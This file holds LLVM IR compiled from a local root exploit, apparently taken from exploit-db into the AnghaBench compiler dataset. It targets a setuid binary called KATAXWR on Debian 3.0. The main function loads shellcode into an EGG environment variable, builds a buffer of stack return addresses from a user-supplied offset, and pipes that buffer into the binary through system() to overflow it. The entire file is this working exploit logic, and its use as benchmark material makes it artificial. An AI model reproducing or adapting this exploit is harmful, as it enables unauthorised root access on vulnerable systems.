; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22567.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22567.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ADDR = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [118 x i8] c"Local (possibly) root exploit for /usr/bin/KATAXWR (leksbot)\0Atested on Debian 3.0 - usage: ./ex [offset] - by gunzip\0A\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@cmd = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.2 = private unnamed_addr constant [64 x i8] c"Return address contains null byte(s), change offset and retry.\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"retaddr=0x%.08x offset=%d len=%d\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c" echo '%s' | %s\00", align 1
@PATH = common dso_local global i8* null, align 8
@sp = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @ADDR, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %6, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %7, align 8
  %17 = load i32, i32* @SIZE, align 4
  %18 = zext i32 %17 to i64
  %19 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %8, align 8
  %20 = ptrtoint i64* %12 to i64
  store i64 %20, i64* %12, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str, i64 0, i64 0))
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = icmp ne i8* %24, null
  br i1 %25, label %26, label %31

26:                                               ; preds = %2
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29)
  store i32 %30, i32* %10, align 4
  br label %33

31:                                               ; preds = %2
  %32 = load i32, i32* @OFFSET, align 4
  store i32 %32, i32* %10, align 4
  br label %33

33:                                               ; preds = %31, %26
  %34 = load i64, i64* %12, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = add i64 %34, %36
  store i64 %37, i64* %11, align 8
  %38 = load i8*, i8** @cmd, align 8
  %39 = load i32, i32* @SIZE, align 4
  %40 = call i32 @memset(i8* %38, i32 0, i32 %39)
  %41 = load i32, i32* @ADDR, align 4
  %42 = call i32 @memset(i8* %16, i32 0, i32 %41)
  %43 = load i32, i32* @SIZE, align 4
  %44 = call i32 @memset(i8* %19, i32 65, i32 %43)
  %45 = load i32, i32* @SIZE, align 4
  %46 = load i8*, i8** @shellcode, align 8
  %47 = call i32 @strlen(i8* %46)
  %48 = sub nsw i32 %45, %47
  %49 = sub nsw i32 %48, 1
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %19, i64 %50
  %52 = load i8*, i8** @shellcode, align 8
  %53 = load i8*, i8** @shellcode, align 8
  %54 = call i32 @strlen(i8* %53)
  %55 = call i32 @memcpy(i8* %51, i8* %52, i32 %54)
  %56 = call i32 @memcpy(i8* %19, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32 4)
  %57 = load i32, i32* @SIZE, align 4
  %58 = sub nsw i32 %57, 1
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %19, i64 %59
  store i8 0, i8* %60, align 1
  %61 = call i32 @putenv(i8* %19)
  store i32 0, i32* %9, align 4
  br label %62

62:                                               ; preds = %72, %33
  %63 = load i32, i32* %9, align 4
  %64 = load i32, i32* @ADDR, align 4
  %65 = icmp slt i32 %63, %64
  br i1 %65, label %66, label %75

66:                                               ; preds = %62
  %67 = load i64, i64* %11, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %16, i64 %69
  %71 = bitcast i8* %70 to i64*
  store i64 %67, i64* %71, align 1
  br label %72

72:                                               ; preds = %66
  %73 = load i32, i32* %9, align 4
  %74 = add nsw i32 %73, 4
  store i32 %74, i32* %9, align 4
  br label %62

75:                                               ; preds = %62
  %76 = load i32, i32* @ADDR, align 4
  %77 = sub nsw i32 %76, 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %16, i64 %78
  %80 = bitcast i8* %79 to i64*
  store i64 0, i64* %80, align 1
  %81 = load i64, i64* %11, align 8
  %82 = and i64 %81, 255
  %83 = icmp ne i64 %82, 0
  br i1 %83, label %84, label %96

84:                                               ; preds = %75
  %85 = load i64, i64* %11, align 8
  %86 = and i64 %85, 65280
  %87 = icmp ne i64 %86, 0
  br i1 %87, label %88, label %96

88:                                               ; preds = %84
  %89 = load i64, i64* %11, align 8
  %90 = and i64 %89, 16711680
  %91 = icmp ne i64 %90, 0
  br i1 %91, label %92, label %96

92:                                               ; preds = %88
  %93 = load i64, i64* %11, align 8
  %94 = and i64 %93, 4278190080
  %95 = icmp ne i64 %94, 0
  br i1 %95, label %99, label %96

96:                                               ; preds = %92, %88, %84, %75
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.2, i64 0, i64 0))
  %98 = call i32 @exit(i32 -1) #4
  unreachable

99:                                               ; preds = %92
  %100 = load i64, i64* %11, align 8
  %101 = trunc i64 %100 to i32
  %102 = load i32, i32* %10, align 4
  %103 = call i32 @strlen(i8* %16)
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 %101, i32 %102, i32 %103)
  %105 = load i8*, i8** @cmd, align 8
  %106 = load i32, i32* @SIZE, align 4
  %107 = sub nsw i32 %106, 4
  %108 = load i8*, i8** @PATH, align 8
  %109 = call i32 @snprintf(i8* %105, i32 %107, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i8* %16, i8* %108)
  %110 = load i8*, i8** @cmd, align 8
  %111 = call i32 @system(i8* %110)
  %112 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %112)
  %113 = load i32, i32* %3, align 4
  ret i32 %113
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @putenv(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*) #2

declare dso_local i32 @system(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
